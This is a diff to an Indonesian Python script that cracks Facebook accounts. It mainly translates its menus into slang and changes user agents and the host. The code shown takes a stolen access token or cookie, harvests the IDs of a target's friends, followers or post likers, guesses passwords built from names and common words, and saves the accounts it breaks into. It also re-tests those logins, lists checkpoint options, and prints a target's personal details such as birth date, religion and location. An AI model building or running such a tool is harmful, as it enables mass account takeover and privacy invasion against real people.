@@ -17,7 +17,7 @@ U = "\x1b[0;95m" # Ungu
 O = "\x1b[0;96m" # Biru Muda
 N = "\033[0m"    # Warna Mati
 url_license = 'https://ngepetonline.000webhostapp.com/chek.php?project=premiumdapunta&apikey='
-host = "https://m.facebook.com"
+host = "https://mbasic.facebook.com"
 ok = []
 cp = []
 ttl = []
@@ -64,14 +64,14 @@ def menu_log():
     clear()
     banner()
     var_menu()
-    pmu = input('%s[%s•%s] %sChoose : '%(K,P,K,P))
+    pmu = input('%s[%s•%s] %sPilih : '%(K,P,K,P))
     print('')
     if pmu in ['']:
         jalan('%s[%s!%s] %sFill In The Correct'%(M,P,M,P))
         menu_log()
     elif pmu in ['1','01','001','a']:
         defaultua()
-        token = input('%s[%s•%s] %sToken : '%(K,P,K,P))
+        token = input('%s[%s•%s] %sMasukin Token Ngab : '%(K,P,K,P))
         try:
             x = requests.get("https://graph.facebook.com/me?access_token=" + token)
             y = json.loads(x.text)
@@ -83,7 +83,7 @@ def menu_log():
             #exit(bot_follow_prem2.main())
             menu()
         except (KeyError,IOError):
-            jalan('\n%s[%s!%s] %sToken Invalid'%(M,P,M,P))
+            jalan('\n%s[%s!%s] %sToken Nya Invalid Kentod'%(M,P,M,P))
             os.system('rm -rf token.txt')
             menu_log()
         except requests.exceptions.ConnectionError:
@@ -91,10 +91,10 @@ def menu_log():
             exit()
     elif pmu in ['2','02','002','b']:
         defaultua()
-        cookie = input('%s[%s•%s] %sCookies : '%(K,P,K,P))
+        cookie = input('%s[%s•%s] %sMasukin Cookie Ngab : '%(K,P,K,P))
         try:
             data = requests.get("https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_", headers = {
-            "user-agent"                : "Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36", # Jangan Di Ganti Ea Anjink.
+            "user-agent"                : "Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109", # Jangan Di Ganti Ea Anjink.
             "referer"                   : "https://m.facebook.com/",
             "host"                      : "m.facebook.com",
             "origin"                    : "https://m.facebook.com",
@@ -117,14 +117,14 @@ def menu_log():
             jalan('\n%s[%s!%s] %sConnection Error'%(M,P,M,P))
             exit()
         except (KeyError,IOError,AttributeError):
-            jalan('\n%s[%s!%s] %sCookies Invalid'%(M,P,M,P))
+            jalan('\n%s[%s!%s] %sCookie Nya Invalid Kentod'%(M,P,M,P))
             os.system('rm -rf token.txt')
             menu_log()
     elif pmu in ['3','03','003','c']:
         clear()
         banner()
         var_tutor()
-        pf = input('%s[%s•%s] %sChoose : '%(K,P,K,P))
+        pf = input('%s[%s•%s] %sPilih : '%(K,P,K,P))
         print('')
         if pf in ['']:
             jalan('%s[%s!%s] %sFill In The Correct'%(M,P,M,P))
@@ -143,7 +143,7 @@ def menu_log():
             menu_log()
         elif pf in ['4','04','004','d']:
             tutor_crack()
-            input('%s[ %sBack %s]%s'%(K,P,K,P))
+            input('%s[ %sKembali %s]%s'%(K,P,K,P))
             menu_log()
         else:
             jalan('%s[%s!%s] %sFill In The Correct'%(M,P,M,P))
@@ -155,8 +155,8 @@ def menu_log():
         input('%s[ %sBack %s]%s'%(K,P,K,P))
         menu_log()
     elif pmu in ['0','00','000','e']:
-        jalan('%s[%s!%s] %sThanks For Using My SC'%(K,P,K,P))
-        jalan('%s[%s!%s] %sHave A Good Day :)\n'%(K,P,K,P))
+        jalan('%s[%s!%s] %sTerimakasih Telah Menggunakan Sc Ini'%(K,P,K,P))
+        jalan('%s[%s!%s] %sSemoga Harimu Suram...\n'%(K,P,K,P))
         os.system('rm -rf token.txt')
         clear()
         exit()
@@ -182,7 +182,7 @@ def menu():
     except (KeyError,IOError):
         status = 'Premium/Pro'
         users = '-'
-        kunci = 'XNX-CODE Team 2021'
+        kunci = 'A-ang-Ganteng-2021'
         bergabung = '-'
         kadaluarsa = '30-Desember-2030'
         pro = ("%s[%sPro%s]"%(K,P,K))
@@ -203,7 +203,7 @@ def menu():
         print('%s'%(M))
         jalan('%s[%s!%s] %sConnection Error'%(M,P,M,P))
         exit()
-    a = requests.get("http://ip-api.com/json/",headers={"Referer":"http://ip-api.com/","Content-Type":"application/json; charset=utf-8","User-Agent":"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"}).json()
+    a = requests.get("http://ip-api.com/json/",headers={"Referer":"http://ip-api.com/","Content-Type":"application/json; charset=utf-8","User-Agent":"Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"}).json()
     try:
         ip = a["query"]
     except KeyError:
@@ -214,16 +214,16 @@ def menu():
     print('\n%s[%s•%s] %sStatus  : %s'%(K,P,K,P,status))
     print('%s[%s•%s] %sKey     : %s'%(K,P,K,P,kunci))
     print('%s[%s•%s] %sExpired : %s'%(K,P,K,P,kadaluarsa))
-    print('\n%s[%s1%s] %sCrack ID Friend/Public %s'%(K,P,K,P,jid))
-    print('%s[%s2%s] %sCrack ID Followers %s'%(K,P,K,P,jid))
-    print('%s[%s3%s] %sCrack ID Likers Post %s'%(K,P,K,P,jid))
-    print('%s[%s4%s] %sGet Data Target'%(K,P,K,P))
-    print('%s[%s5%s] %sDump Amount Of Friend %s'%(K,P,K,P,pro))
-    print('%s[%s6%s] %sSee Result Crack'%(K,P,K,P))
-    print('%s[%s7%s] %sCheck Option Result Crack %s'%(K,P,K,P,pro))
-    print('%s[%s8%s] %sUser Agent'%(K,P,K,P))
-    print('%s[%s0%s] %sLog Out'%(K,P,K,P))
-    pm = input('%s[%s•%s] %sChoose : '%(K,P,K,P))
+    print('\n%s[%s1%s] %sCrack ID Dari Teman Publik %s'%(K,P,K,P,jid))
+    print('%s[%s2%s] %sCrack ID Dari Followers %s'%(K,P,K,P,jid))
+    print('%s[%s3%s] %sCrack ID Dari Like Postingan %s'%(K,P,K,P,jid))
+    print('%s[%s4%s] %sAmbil Data Akun Facebook'%(K,P,K,P))
+    print('%s[%s5%s] %sDump Jumlah Teman %s'%(K,P,K,P,pro))
+    print('%s[%s6%s] %sLihat Hasil Crack Saya'%(K,P,K,P))
+    print('%s[%s7%s] %sCek Opsi Hasil Crack%s'%(K,P,K,P,pro))
+    print('%s[%s8%s] %sSetting User Agent'%(K,P,K,P))
+    print('%s[%s0%s] %sKeluar'%(K,P,K,P))
+    pm = input('%s[%s•%s] %sPilih : '%(K,P,K,P))
     print('')
     if pm in ['']:
         jalan('%s[%s!%s] %sFill In The Correct'%(M,P,M,P))
@@ -263,7 +263,7 @@ def defaultua():
         menu_log()
 def ugen():
     var_ugen()
-    pmu = input('%s[%s•%s] %sChoose : '%(K,P,K,P))
+    pmu = input('%s[%s•%s] %sPilih : '%(K,P,K,P))
     print('')
     if pmu in[""]:
         jalan('%s[%s!%s] %sFill In The Correct'%(M,P,M,P))
@@ -274,25 +274,25 @@ def ugen():
         menu()
     elif pmu in ['2','02','002','b']:
         os.system("rm -rf ugent.txt")
-        ua = input("%s[%s•%s] %sInput User Agent : \n\n"%(K,P,K,P))
+        ua = input("%s[%s•%s] %sMasukan User Agent : \n\n"%(K,P,K,P))
         try:
             ugent = open('ugent.txt','w')
             ugent.write(ua)
             ugent.close()
-            jalan("\n%s[ %sSuccess Changed User Agent %s]"%(K,P,K))
-            input('\n%s[ %sBack %s]%s'%(K,P,K,P))
+            jalan("\n%s[ %sBerhasil Mengganti User Agent %s]"%(K,P,K))
+            input('\n%s[ %sKembali %s]%s'%(K,P,K,P))
             menu()
         except (KeyError,IOError):
-            jalan("\n%s[ %sFailed To Change User Agent %s]"%(M,P,M))
+            jalan("\n%s[ %sGagal Mengganti User Agent %s]"%(M,P,M))
             print('%s'%(M))
-            input('%s[ %sBack %s]%s'%(M,P,M,P))
+            input('%s[ %sKembali %s]%s'%(M,P,M,P))
             menu()
     elif pmu in ['3','03','003','c']:
         ugen_hp()
     elif pmu in ['4','04','004','d']:
         os.system("rm -rf ugent.txt")
-        jalan("%s[ %sSuccess Remove User Agent %s]"%(K,P,K))
-        input('\n%s[ %sBack %s]%s'%(K,P,K,P))
+        jalan("%s[ %sBerhasil Menghapus User Agent %s]"%(K,P,K))
+        input('\n%s[ %sKembali %s]%s'%(K,P,K,P))
         menu()
     elif pmu in ['5','05','005','e']:
         try:
@@ -300,8 +300,8 @@ def ugen():
         except (KeyError,IOError):
             ungser = 'Not Found'
         print("%s[%s•%s] %sUser Agent Used : \n\n%s%s"%(K,P,K,P,K,ungser))
-        jalan("\n%s[ %sThis Is Your User Agent Now %s]"%(K,P,K))
-        input('\n%s[ %sBack %s]%s'%(K,P,K,P))
+        jalan("\n%s[ %sUser Agent Kamu Saat Ini %s]"%(K,P,K))
+        input('\n%s[ %sKembali %s]%s'%(K,P,K,P))
         menu()
     elif pmu in ['0','00','000','f']:
         menu()
@@ -337,7 +337,7 @@ def ugen_hp():
     elif pc in ['8','08']:
         ugent = open('ugent.txt','w');ugent.write(ua_windows);ugent.close()
     else:jalan('%s[%s!%s] %sFill In The Correct'%(M,P,M,P));menu()
-    jalan("%s[ %sSuccess Changed User Agent %s]"%(K,P,K))
+    jalan("%s[ %sBerhasil Mengganti User Agent %s]"%(K,P,K))
     input('\n%s[ %sBack %s]%s'%(K,P,K,P))
     menu()
 def publik():
@@ -372,7 +372,7 @@ def publik():
             ob = json.loads(pb.text)
             print ('%s[%s•%s] %sName : %s'%(K,P,K,P,ob['name']))
         except (KeyError,IOError):
-            jalan('\n%s[%s!%s] %sID Not Found'%(M,P,M,P))
+            jalan('\n%s[%s!%s] %sID Tidak Ditemukan'%(M,P,M,P))
             menu()
         r = requests.get("https://graph.facebook.com/%s/friends?limit=%s&access_token=%s"%(it,jid,token))
         id = []
@@ -417,9 +417,9 @@ def pengikut():
         try:
             pb = requests.get("https://graph.facebook.com/" + it + "?access_token=" + token)
             ob = json.loads(pb.text)
-            print ('%s[%s•%s] %sName : %s'%(K,P,K,P,ob['name']))
+            print ('%s[%s•%s] %sNama : %s'%(K,P,K,P,ob['name']))
         except (KeyError,IOError):
-            jalan('\n%s[%s!%s] %sID Not Found'%(M,P,M,P))
+            jalan('\n%s[%s!%s] %sID Tidak Ditemukan'%(M,P,M,P))
             menu()
         r = requests.get("https://graph.facebook.com/%s/subscribers?limit=%s&access_token=%s"%(it,jid,token))
         id = []
@@ -464,9 +464,9 @@ def likers():
         try:
             pb = requests.get("https://graph.facebook.com/" + it + "?access_token=" + token)
             ob = json.loads(pb.text)
-            print ('%s[%s•%s] %sName : %s'%(K,P,K,P,ob['name']))
+            print ('%s[%s•%s] %sNama : %s'%(K,P,K,P,ob['name']))
         except (KeyError,IOError):
-            jalan('\n%s[%s!%s] %sID Not Found'%(M,P,M,P))
+            jalan('\n%s[%s!%s] %sID Tidak Ditemukan'%(M,P,M,P))
             menu()
         r = requests.get("https://graph.facebook.com/%s/likes?limit=%s&access_token=%s"%(it,jid,token))
         id = []
@@ -519,15 +519,15 @@ def pass_dev(_cici_):
     _dapunta_.append(_cici_.lower())
     return _dapunta_
 def tambah_pass():
-    print('%s[%s Set Password %s]'%(K,P,K))
-    print('%s[%s•%s] %sExample : sayang,bismillah,123456,786786'%(K,P,K,P))
-    cuy = input('%s[%s•%s] %sInput Extra Manual Pass [1 Word] : '%(K,P,K,P))
+    print('%s[%s Setel Password %s]'%(K,P,K))
+    print('%s[%s•%s] %sContoh : sayang,bismillah,123456,786786'%(K,P,K,P))
+    cuy = input('%s[%s•%s] %sMasukan Pass Tambahan [1 Kata] : '%(K,P,K,P))
     gh = open('pass.txt','w')
     gh.write(cuy)
     gh.close
 def tambah_pass_angka():
-    print('%s[%s•%s] %sExample : 321,786,gaming,ganteng'%(K,P,K,P))
-    coy = input('%s[%s•%s] %sInput After Name Pass : '%(K,P,K,P))
+    print('%s[%s•%s] %sContoh : 321,786,gaming,ganteng'%(K,P,K,P))
+    coy = input('%s[%s•%s] %sMasukan Pass Dibelakang Nama : '%(K,P,K,P))
     xy = open('passangka.txt','w')
     xy.write(coy)
     xy.close
@@ -619,7 +619,7 @@ def log_free(em,pas,hosts):
         return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
     else:return {"status":"error","email":em,"pass":pas}
 def cek_log(user, pasw, h_cp):
-    ua = "Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36"
+    ua = "Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109"
     mb = "https://mbasic.facebook.com"
     ses = requests.Session()
     ses.headers.update({
@@ -766,14 +766,14 @@ class crack:
                         self.fl.append({"id":i.split("•")[0],"pw":pass_dev(i.split("•")[1])})
                     except:continue
                 start_method()
-                put = input('%s[%s•%s] %sChoose : '%(K,P,K,P))
+                put = input('%s[%s•%s] %sPilih : '%(K,P,K,P))
                 print('')
                 if put in ['']:
                     jalan('%s[%s!%s] %sFill In The Correct'%(M,P,M,P))
                     menu()
                 elif put in ['1','01','001','a']:
-                    print('%s[%s•%s] %sShow Checkpoint Option? [y/n]'%(K,P,K,P))
-                    puf = input('%s[%s•%s] %sChoose : '%(K,P,K,P))
+                    print('%s[%s•%s] %sApakah Kamu Jomblo? [y/n]'%(K,P,K,P))
+                    puf = input('%s[%s•%s] %sPilih : '%(K,P,K,P))
                     if puf in ['']:
                         jalan('%s[%s!%s] %sFill In The Correct'%(M,P,M,P))
                         menu()
@@ -794,8 +794,8 @@ class crack:
                         jalan('%s[%s!%s] %sFill In The Correct'%(M,P,M,P))
                         menu()
                 elif put in ['2','02','002','b']:
-                    print('%s[%s•%s] %sShow Checkpoint Option? [y/n]'%(K,P,K,P))
-                    puf = input('%s[%s•%s] %sChoose : '%(K,P,K,P))
+                    print('%s[%s•%s] %sApakah Kamu Jomblo? [y/n]'%(K,P,K,P))
+                    puf = input('%s[%s•%s] %sPilih : '%(K,P,K,P))
                     if puf in ['']:
                         jalan('%s[%s!%s] %sFill In The Correct'%(M,P,M,P))
                         menu()
@@ -816,8 +816,8 @@ class crack:
                         jalan('%s[%s!%s] %sFill In The Correct'%(M,P,M,P))
                         menu()
                 elif put in ['3','03','003','c']:
-                    print('%s[%s•%s] %sShow Checkpoint Option? [y/n]'%(K,P,K,P))
-                    puf = input('%s[%s•%s] %sChoose : '%(K,P,K,P))
+                    print('%s[%s•%s] %sApakah Kamu Jomblo? [y/n]'%(K,P,K,P))
+                    puf = input('%s[%s•%s] %sPilih : '%(K,P,K,P))
                     if puf in ['']:
                         jalan('%s[%s!%s] %sFill In The Correct'%(M,P,M,P))
                         menu()
@@ -1112,38 +1112,38 @@ def target():
     except (KeyError,IOError):ab = ("-")
     try:lo = zy["locale"]
     except (KeyError,IOError):lo = ("-")
-    jalan('%s[%s•%s] %sName : %s'%(K,P,K,P,nm))
-    jalan('%s[%s•%s] %sFirst Name : %s'%(K,P,K,P,nd))
-    jalan('%s[%s•%s] %sMiddle Name : %s'%(K,P,K,P,nt))
-    jalan('%s[%s•%s] %sLast Name : %s'%(K,P,K,P,nb))
-    jalan('%s[%s•%s] %sDate Of Birth : %s'%(K,P,K,P,ut))
+    jalan('%s[%s•%s] %sNama : %s'%(K,P,K,P,nm))
+    jalan('%s[%s•%s] %sNama Depan : %s'%(K,P,K,P,nd))
+    jalan('%s[%s•%s] %sNama Tengah : %s'%(K,P,K,P,nt))
+    jalan('%s[%s•%s] %sNama Belakang : %s'%(K,P,K,P,nb))
+    jalan('%s[%s•%s] %sTanggal Lahir : %s'%(K,P,K,P,ut))
     jalan('%s[%s•%s] %sGender : %s'%(K,P,K,P,gd))
     jalan('%s[%s•%s] %sEmail : %s'%(K,P,K,P,em))
     jalan('%s[%s•%s] %sLink : %s'%(K,P,K,P,lk))
     jalan('%s[%s•%s] %sUsername : %s'%(K,P,K,P,us))
-    jalan('%s[%s•%s] %sReligion : %s'%(K,P,K,P,rg))
-    jalan('%s[%s•%s] %sRelationship Status : %s'%(K,P,K,P,rl))
-    jalan('%s[%s•%s] %sRelationship With : %s'%(K,P,K,P,rls))
-    jalan('%s[%s•%s] %sLocation : %s'%(K,P,K,P,lc))
-    jalan('%s[%s•%s] %sHometown : %s'%(K,P,K,P,ht))
-    jalan('%s[%s•%s] %sAbout : %s'%(K,P,K,P,ab))
+    jalan('%s[%s•%s] %sAgama : %s'%(K,P,K,P,rg))
+    jalan('%s[%s•%s] %sStatus Hubungan : %s'%(K,P,K,P,rl))
+    jalan('%s[%s•%s] %sHubungaj Dengan : %s'%(K,P,K,P,rls))
+    jalan('%s[%s•%s] %sTempat Tinggal : %s'%(K,P,K,P,lc))
+    jalan('%s[%s•%s] %sTempat Asal : %s'%(K,P,K,P,ht))
+    jalan('%s[%s•%s] %sTentang : %s'%(K,P,K,P,ab))
     jalan('%s[%s•%s] %sLocale : %s'%(K,P,K,P,lo))
-    input('\n%s[ %sBack %s]%s'%(K,P,K,P))
+    input('\n%s[ %sKembali %s]%s'%(K,P,K,P))
     menu()
 def teman_target():
 #    cek_license()
-    it = input('%s[%s•%s] %sID Target : '%(K,P,K,P))
+    it = input('%s[%s?%s] %sID Target : '%(K,P,K,P))
     try:
         token = open('token.txt','r').read()
         mm = requests.get('https://graph.facebook.com/%s?access_token=%s'%(it,token))
         nn = json.loads(mm.text)
-        print ('%s[%s•%s] %sName : %s'%(K,P,K,P,nn['name']))
+        print ('%s[%s•%s] %sNama : %s'%(K,P,K,P,nn['name']))
     except (KeyError,IOError):
         jalan('%s[%s!%s] %sToken/Cookies Invalid'%(M,P,M,P))
         menu_log()
     tt=[]
     te=[]
-    lim = input('%s[%s•%s] %sLimit Dump : '%(K,P,K,P))
+    lim = input('%s[%s?%s] %sLimit Dump : '%(K,P,K,P))
     print('%s%s'%(K,P))
     ada = requests.get('https://graph.facebook.com/%s/friends?limit=%s&access_token=%s'%(it,lim,token))
     idi = json.loads(ada.text)
@@ -1167,20 +1167,20 @@ def teman_target():
 def hasil():
     clear()
     banner()
-    jalan('\n%s[ %sResult Crack %s]'%(K,P,K))
-    print('\n%s[%s1%s] %sCheck Result OK'%(K,P,K,P))
-    print('%s[%s2%s] %sCheck Result CP'%(K,P,K,P))
-    ch = input('%s[%s•%s] %sChoose : '%(K,P,K,P))
+    jalan('\n%s[ %sHasil Crack Kamu %s]'%(K,P,K))
+    print('\n%s[%s1%s] %sCek Hasil OK'%(K,P,K,P))
+    print('%s[%s2%s] %sCek Hasil CP'%(K,P,K,P))
+    ch = input('%s[%s•%s] %sPilih : '%(K,P,K,P))
     if ch in ['']:
         jalan('%s[%s!%s] %sFill In The Correct'%(M,P,M,P))
         menu()
     elif ch in ['1','01','001','a']:
         try:
             okl = os.listdir("OK")
-            print('\n%s[%s Result Crack Has Been Saved At File OK %s]\n'%(K,P,K))
+            print('\n%s[%s Hasil Crack Akun OK %s]\n'%(K,P,K))
             for file in okl:
                 print('%s[%s•%s] %s%s'%(K,P,K,P,file))
-            files = input('\n%s[%s•%s] %sInput File Name : '%(K,P,K,P))
+            files = input('\n%s[%s•%s] %sMasukan Nama File : '%(K,P,K,P))
             print('')
             if files == "":
                 jalan('%s[%s!%s] %sFill In The Correct'%(M,P,M,P))
@@ -1188,16 +1188,16 @@ def hasil():
             os.system('cat OK/%s'%(files))
             ppp = open("OK/%s"%(files)).read().splitlines()
             del1 = ("%s"%(files)).replace("-", " ").replace(".txt", "")
-            print('\n%s[%s•%s] %sTotal Result Crack At %s Is %s Account'%(K,P,K,P,del1,len(ppp)))
+            print('\n%s[%s•%s] %sTotal Hasil Crack %s Adalah %s Akun'%(K,P,K,P,del1,len(ppp)))
         except (KeyError,IOError):
             print('%s[%s Result Not Found %s]'%(M,P,M))
     elif ch in ['2','02','002','b']:
         try:
             cpl = os.listdir("CP")
-            print('\n%s[%s Result Crack Has Been Saved At File CP %s]\n'%(K,P,K))
+            print('\n%s[%s Hasil Crack Akun CP %s]\n'%(K,P,K))
             for file in cpl:
                 print('%s[%s•%s] %s%s'%(K,P,K,P,file))
-            files = input('\n%s[%s•%s] %sInput File Name : '%(K,P,K,P))
+            files = input('\n%s[%s•%s] %sMasukan Nama File : '%(K,P,K,P))
             print('')
             if files == "":
                 jalan('%s[%s!%s] %sFill In The Correct'%(M,P,M,P))
@@ -1205,16 +1205,16 @@ def hasil():
             os.system('cat CP/%s'%(files))
             ppp = open("CP/%s"%(files)).read().splitlines()
             del1 = ("%s"%(files)).replace("-", " ").replace(".txt", "")
-            print('\n%s[%s•%s] %sTotal Result Crack At %s Is %s Account'%(K,P,K,P,del1,len(ppp)))
+            print('\n%s[%s•%s] %sTotal Hasil Crack %s Adalah %s Akun'%(K,P,K,P,del1,len(ppp)))
         except (KeyError,IOError):
-            print('%s[%s Result Not Found %s]'%(M,P,M))
+            print('%s[%s Tidak Ada Hasil %s]'%(M,P,M))
     else:
         jalan('%s[%s!%s] %sFill In The Correct'%(M,P,M,P))
         menu()
-    input('\n%s[ %sBack %s]%s'%(K,P,K,P))
+    input('\n%s[ %sKembali %s]%s'%(K,P,K,P))
     menu()
 def log_hasil(user, pasw):
-    ua = "Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36"
+    ua = "Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109"
     ses = requests.Session()
     ses.headers.update({
     "Host": "mbasic.facebook.com",
@@ -1248,7 +1248,7 @@ def log_hasil(user, pasw):
     except requests.exceptions.TooManyRedirects:
         print("%s[%s!%s] %sAkun Terkena Spam"%(M,P,M,P))
     if "c_user" in ses.cookies:
-        print("%s[%s•%s] %sAkun OK Tidak Checkpoint"%(H,P,H,P))
+        print("%s[%s✓%s] %sAkun One Tap Nih Ngab"%(H,P,H,P))
     elif "checkpoint" in ses.cookies:
         form = run.find("form")
         dtsg = form.find("input",{"name":"fb_dtsg"})["value"]
@@ -1266,39 +1266,39 @@ def log_hasil(user, pasw):
         xnxx = par(ses.post(host+form["action"], data=dataD).text, "html.parser")
         ngew = [yy.text for yy in xnxx.find_all("option")]
         if(str(len(ngew))=="0"):
-            print("%s[%s•%s] %sOne Tap Account [Login]"%(H,P,H,P))
+            print("%s[%s✓%s] %sAkun One Tap Nih Ngab [Gas Login]"%(H,P,H,P))
         else:
-            print("%s[%s•%s] %sFound %s Option "%(K,P,K,P,str(len(ngew))))
+            print("%s[%s•%s] %sTerdapat %s Opsi "%(K,P,K,P,str(len(ngew))))
         for opt in range(len(ngew)):
             print(" "*3, str(opt+1)+". "+ngew[opt])
     elif "login_error" in str(run):
         oh = run.find("div",{"id":"login_error"}).find("div").text
         print("%s[%s!%s] %s%s"%(M,P,M,P,oh))
     else:
-        print("%s[%s!%s] %sPassword Was Changed"%(M,P,M,P))
+        print("%s[%s!%s] %sKata Sandi Salah"%(M,P,M,P))
 def cek_hasil():
 #    cek_license()
-    jalan('%s[ %sCheck Option Result Crack %s]'%(K,P,K))
-    print('\n%s[%s•%s] %sFile Example : CP/%s.txt'%(K,P,K,P,tanggal))
-    files = input('%s[%s•%s] %sInput File : '%(K,P,K,P))
+    jalan('%s[ %sCek Opsi Hasil Crack %s]'%(K,P,K))
+    print('\n%s[%s•%s] %sFile Kamu : CP/%s.txt'%(K,P,K,P,tanggal))
+    files = input('%s[%s•%s] %sMasukan Nama File : '%(K,P,K,P))
     try:
         buka_baju = open(files,"r").readlines()
     except FileNotFoundError:
         print("%s[%s!%s] %sFile Not Found"%(M,P,M,P))
         time.sleep(2); cek_hasil()
-    print("%s[%s•%s] %sTotal Account : %s"%(K,P,K,P,str(len(buka_baju))))
+    print("%s[%s•%s] %sTotal Akun : %s"%(K,P,K,P,str(len(buka_baju))))
     print("")
     for memek in buka_baju:
         kontol = memek.replace("\n","")
         titid  = kontol.split("•")
-        print("%s[%s•%s] %sCheck Login : %s"%(K,P,K,P,kontol))
+        print("%s[%s•%s] %sMencoba Login : %s"%(K,P,K,P,kontol))
         try:
             log_hasil(titid[0], titid[1])
         except requests.exceptions.ConnectionError:
             continue
         print("")
     print("")
-    print('%s[%s•%s] %sChecking Proccess Was Ended'%(K,P,K,P))
+    print('%s[%s•%s] %sProses Cek Selesai'%(K,P,K,P))
     input('\n%s[ %sBack %s]%s'%(K,P,K,P))
     menu()
 def buy_license():
@@ -1374,12 +1374,12 @@ def cek_license():
         jalan('%s[%s•%s] %sBuy A License To The Admin First'%(K,P,K,P))
         exit()
 def var_menu():
-    print('%s[ %sChoose Login Methode %s]'%(K,P,K))
-    print('\n%s[%s1%s] %sLogin With Token'%(K,P,K,P))
-    print('%s[%s2%s] %sLogin With Cookies'%(K,P,K,P))
-    print('%s[%s3%s] %sHow To Use Script'%(K,P,K,P))
+    print('%s[ %sPilih Metode Login%s]'%(K,P,K))
+    print('\n%s[%s1%s] %sLogin Pakai Token'%(K,P,K,P))
+    print('%s[%s2%s] %sLogin Pakai Cookie'%(K,P,K,P))
+    print('%s[%s3%s] %sTutorial Menggunakan Script'%(K,P,K,P))
     print('%s[%s4%s] %sInfo Author & Team Project'%(K,P,K,P))
-    print('%s[%s0%s] %sExit'%(K,P,K,P))
+    print('%s[%s0%s] %sKeluar'%(K,P,K,P))
 def var_tutor():
     mlaku('%s[%s Tips & Tutorial %s]'%(K,P,K))
     print('\n%s[%s1%s] %sHow To Get Token'%(K,P,K,P))
@@ -1416,23 +1416,24 @@ def var_author():
     mlaku('%s     • %sYogzz'%(K,P))
     mlaku('%s     • %sAkhmad'%(K,P))
     mlaku('%s     • %sViko'%(K,P))
+    mlaku('%s     • %sFauzan Gtg.'%(K,P))
     mlaku('%s'%(K))
 def var_ugen():
-    print("%s[%s1%s] %sGet My User Agent"%(K,P,K,P))
-    print("%s[%s2%s] %sChange User Agent %s[%sManual%s]"%(K,P,K,P,K,P,K))
-    print("%s[%s3%s] %sChange User Agent %s[%sBased Of Phone Type%s]"%(K,P,K,P,K,P,K))
-    print("%s[%s4%s] %sRemove User Agent"%(K,P,K,P))
-    print("%s[%s5%s] %sCheck User Agent"%(K,P,K,P))
-    print("%s[%s0%s] %sBack"%(K,P,K,P))
+    print("%s[%s1%s] %sMendapatkan User Agent"%(K,P,K,P))
+    print("%s[%s2%s] %sGanti User Agent %s[%sManual%s]"%(K,P,K,P,K,P,K))
+    print("%s[%s3%s] %sGanti User Agent %s[%sBased Of Phone Type%s]"%(K,P,K,P,K,P,K))
+    print("%s[%s4%s] %sHapus User Agent"%(K,P,K,P))
+    print("%s[%s5%s] %sCek User Agent"%(K,P,K,P))
+    print("%s[%s0%s] %sKembali"%(K,P,K,P))
 def start_method():
-    print('\n%s[%s1%s] %sApi Metode'%(K,P,K,P))
-    print('%s[%s2%s] %sMbasic Metode'%(K,P,K,P))
-    print('%s[%s3%s] %sFree FB Metode'%(K,P,K,P))
+    print('\n%s[%s1%s] %sMetode B-Api [Kenceng]'%(K,P,K,P))
+    print('%s[%s2%s] %sMetode Mbasic [Mode Santuy]'%(K,P,K,P))
+    print('%s[%s3%s] %sMetode Free Fb [Ini Lambat Bego]'%(K,P,K,P))
 def started():
-    print('\n%s[%s•%s] %sCrack Started...'%(K,P,K,P))
-    print('%s[%s•%s] %sAccount [OK] Saved In OK/%s.txt'%(K,P,K,P,tanggal))
-    print('%s[%s•%s] %sAccount [CP] Saved InCP/%s.txt'%(K,P,K,P,tanggal))
-    print('%s[%s•%s] %sIf No Result, Turn On Airplane Mode (5 Sec)\n'%(K,P,K,P))
+    print('\n%s[%s•%s] %sCrack Sedang Berjalan...'%(K,P,K,P))
+    print('%s[%s•%s] %sAkun OK Saved In OK/%s.txt'%(K,P,K,P,tanggal))
+    print('%s[%s•%s] %sAkun CP Saved In CP/%s.txt'%(K,P,K,P,tanggal))
+    print('%s[%s•%s] %sJika Tidak Ada Hasil, Mode Pesawatkan(5 Detik)\n'%(K,P,K,P))
 def folder():
     try:os.mkdir("CP")
     except:pass
